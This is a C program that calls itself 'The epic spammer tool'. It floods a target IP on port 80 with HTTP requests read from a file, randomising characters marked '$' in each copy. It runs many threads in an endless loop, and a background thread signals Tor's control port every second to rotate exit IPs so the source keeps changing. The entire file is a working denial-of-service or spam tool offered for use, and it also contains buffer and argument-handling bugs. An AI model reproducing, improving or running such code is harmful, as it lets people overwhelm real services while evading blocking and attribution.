#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <netdb.h>
#include <time.h>

#define delay 1// delay in seconds

struct sockaddr_in sa;
int debug;
char *req; 
char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
struct timeval tv;

int changereq(char *req2) {
 int a;
 for(int i = 0; i < strlen(req2); i++) {
  a = rand() % (strlen(charset) - 0) + 0;
  if(req2[i] == '$') {
   req2[i] = charset[a];
  }
 }
}

void *spam() {
 char *req2 = malloc(strlen(req)); 
 strcpy(req2, req);
 changereq(req2);
 int fd = socket(AF_INET, SOCK_STREAM, 0); 
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
  send(fd, req2, strlen(req2), MSG_NOSIGNAL);
  if(debug == 1) {
   char *resp = malloc(1024);
   recv(fd, resp, 1024, 0);
   dprintf(1, "%s", resp);
   free(resp);
  }
 }
 close(fd);
 free(req2);
}

int readreq(char *file) {
 if(fopen(file, "rb") != 0) {
  FILE *fd = fopen(file, "rb");
  fseek(fd, 0, SEEK_END); 
  int size = ftell(fd); 
  fseek(fd, 0, SEEK_SET); 
  req = malloc(size); 
  fread(req, size, size, fd); 
  fclose(fd);
 } else {
  dprintf(1, "File does not exist\n");
  exit(0);
 }
}

int makesa(char *ip) {
 sa.sin_addr.s_addr = inet_addr(ip);
 sa.sin_port = htons(80);
 sa.sin_family = AF_INET;
}

void *torswitch(void *unused) {
 while(1) { 
  sleep(delay);
  char *torresp = malloc(100);
  struct sockaddr_in tor;
  tor.sin_addr.s_addr = inet_addr("127.0.0.1"); 
  tor.sin_port = htons(9051); 
  tor.sin_family = AF_INET;
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  if(connect(fd, (struct sockaddr *)&tor, sizeof(tor)) != -1) {
   write(fd, "AUTHENTICATE \"\"", 16);
   write(fd, "signal NEWNYM\n\x00", 16);
   recv(fd, torresp, 100, 0);
   if(!strstr(torresp, "250")) {
    dprintf(1, "Switching ip failed try increasing delay or tor --hash-password \"\" and put it in /etc/tor/torrc in front of HashedControlPassword\n");
   }
  } else {
   dprintf(1, "Tor control port not reachable, activate in /etc/tor/torrc\n");
  }
  close(fd); 
  free(torresp);
 }
}

int main(int argc, char **argv) {
 debug = 0;
 tv.tv_sec = 1;
 srand(time(0));
 dprintf(1, "The epic spammer tool\nMade by Chakal\n");
 sleep(1);
 if(argc < 3) {
  dprintf(1, "ip threads file");
  return 0;
 } 
 dprintf(1, "print output? y/n\n");
 char a = getc(stdin);
 if(a == 'y' || a == 'Y') {
  dprintf(1, "Output Activated\n");
  debug = 1;
 }
 makesa(argv[1]);
 readreq(argv[3]); 
 pthread_t thread[atoi(argv[2])];
 pthread_t threadtor;
 pthread_create(&threadtor, 0, &torswitch, 0); 
 while(1) {
  for(int i = 0; i < atoi(argv[2]); i++) {
   pthread_create(&thread[i], 0, &spam, 0); 
  }
  for(int i = 0; i < atoi(argv[2]); i++) {
   pthread_join(thread[i], 0);
  }
 }
}